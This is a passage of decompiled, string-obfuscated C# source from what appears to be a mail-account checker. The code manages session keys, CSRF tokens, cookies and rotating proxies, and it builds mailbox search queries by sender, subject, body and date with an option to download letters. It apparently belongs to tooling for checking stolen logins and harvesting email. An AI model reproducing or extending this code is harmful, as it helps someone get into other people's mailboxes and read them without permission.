				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddHeader(<Module>.smethod_2<string>(1798185715), <Module>.smethod_4<string>(1140862287));
					string text = <Module>.smethod_2<string>(544157801) + this._ckey + <Module>.smethod_4<string>(-1163285469);
					if (httpRequest.Post(<Module>.smethod_3<string>(-316062838), text, <Module>.smethod_5<string>(-1722116199)).ToString().Contains(<Module>.smethod_4<string>(1369213571)))
					{
						result = OperationResult.Ok;
					}
					else
					{
						result = OperationResult.Error;
					}
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
				result = OperationResult.Retry;
			}
			return result;
		}

		// Token: 0x060005CE RID: 1486 RVA: 0x00026D10 File Offset: 0x00024F10
		private string BuildSearchQuery(Request request)
		{
			StringBuilder stringBuilder = new StringBuilder(<Module>.smethod_6<string>(252319571));
			if (request.Sender != null)
			{
				stringBuilder.Append(<Module>.smethod_6<string>(1289990179) + request.Sender + <Module>.smethod_2<string>(-764203487));
			}
			if (request.Body != null)
			{
				stringBuilder.Append(<Module>.smethod_4<string>(144752773) + request.Body + <Module>.smethod_6<string>(1115281894));
				stringBuilder.Append(<Module>.smethod_5<string>(603396485));
			}
			else if (request.Subject != null)
			{
				stringBuilder.Append(<Module>.smethod_5<string>(983299217) + request.Subject + <Module>.smethod_5<string>(-1407782992));
				stringBuilder.Append(<Module>.smethod_6<string>(-486402599));
			}
			stringBuilder.Append(<Module>.smethod_2<string>(-951869309));
			stringBuilder.Append(this._ckey);
			stringBuilder.Append(<Module>.smethod_2<string>(-636344042));
			stringBuilder.Append(SearchSettings.Instance.DownloadLetters ? SearchSettings.Instance.DownloadLettersLimit : 1);
			stringBuilder.Append(<Module>.smethod_5<string>(1961668511));
			if (!request.CheckDate)
			{
				if (SearchSettings.Instance.CheckDate)
				{
					if (SearchSettings.Instance.DateFrom != null)
					{
						stringBuilder.Append(<Module>.smethod_6<string>(-367351801) + SearchSettings.Instance.DateFrom.Value.ToString(<Module>.smethod_4<string>(1645735782)) + <Module>.smethod_2<string>(-764203487));
					}
					if (SearchSettings.Instance.DateTo != null)
					{
						stringBuilder.Append(<Module>.smethod_3<string>(1592715986) + SearchSettings.Instance.DateTo.Value.ToString(<Module>.smethod_6<string>(-196103086)) + <Module>.smethod_4<string>(347314178));
					}
				}
			}
			else
			{
				if (request.DateFrom != null)
				{
					stringBuilder.Append(<Module>.smethod_4<string>(-1758992755) + request.DateFrom.Value.ToString(<Module>.smethod_6<string>(-196103086)) + <Module>.smethod_6<string>(1115281894));
				}
				if (request.DateTo != null)
				{
					stringBuilder.Append(<Module>.smethod_3<string>(1592715986) + request.DateTo.Value.ToString(<Module>.smethod_6<string>(-196103086)) + <Module>.smethod_2<string>(-764203487));
				}
			}
			return stringBuilder.ToString();
		}

		// Token: 0x060005CF RID: 1487 RVA: 0x00009D23 File Offset: 0x00007F23
		private void Reset()
		{
			this._cookies = new CookieDictionary(false);
			if (ProxySettings.Instance.UseProxy)
			{
				this._proxyClient = ProxyManager.Instance.GetProxy();
			}
		}

		// Token: 0x060005D0 RID: 1488 RVA: 0x00026FB4 File Offset: 0x000251B4
		private void SetHeaders(HttpRequest request)
		{
			request.IgnoreProtocolErrors = true;
			request.ConnectTimeout = CheckerSettings.Instance.Timeout * 1000;
			request.Cookies = this._cookies;
			request.Proxy = this._proxyClient;
			request.UserAgent = <Module>.smethod_4<string>(1820059280);
		}

		// Token: 0x060005D1 RID: 1489 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x04000304 RID: 772
		private Mailbox _mailbox;

		// Token: 0x04000305 RID: 773
		private ProxyClient _proxyClient;

		// Token: 0x04000306 RID: 774
		private CookieDictionary _cookies;

		// Token: 0x04000307 RID: 775
		private string _csrfToken;

		// Token: 0x04000308 RID: 776
		private string _trackId;

		// Token: 0x04000309 RID: 777
		private string _ckey;
	}
}
